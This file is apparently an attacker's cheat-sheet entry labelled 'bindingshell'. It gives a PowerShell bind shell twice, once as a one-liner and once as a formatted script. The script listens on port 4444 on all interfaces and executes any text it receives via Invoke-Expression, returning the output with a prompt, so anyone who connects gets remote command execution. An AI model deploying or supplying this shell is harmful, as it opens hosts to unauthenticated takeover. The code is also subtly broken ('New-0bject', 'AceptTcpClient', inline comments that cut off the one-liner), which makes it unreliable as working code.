#bindingshell
#cmd:powershell -c "$listener = New-0bject System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|ForEach-Object{0};while(($i = $Stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback1 = (Invoke-Expression $data 2>&1 | Out-String);     #Invoke-Expression=iex$sendback2 = $sendback1 + 'PS' + (Get-Location).Path + '>';   #Get-Location=pwd$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()$listener.Stop()"

$listener = New-0bject System.Net.Sockets.TcpListener('0.0.0.0',4444);
$listener.start();
$client = $listener.AceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|ForEach-Object{0};                       #ForEach-Object=%
while(($i = $Stream.Read($bytes,0,$bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback1 = (Invoke-Expression $data 2>&1 | Out-String);     #Invoke-Expression=iex
    $sendback2 = $sendback1 + 'PS' + (Get-Location).Path + '>';   #Get-Location=pwd
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close()
$listener.Stop()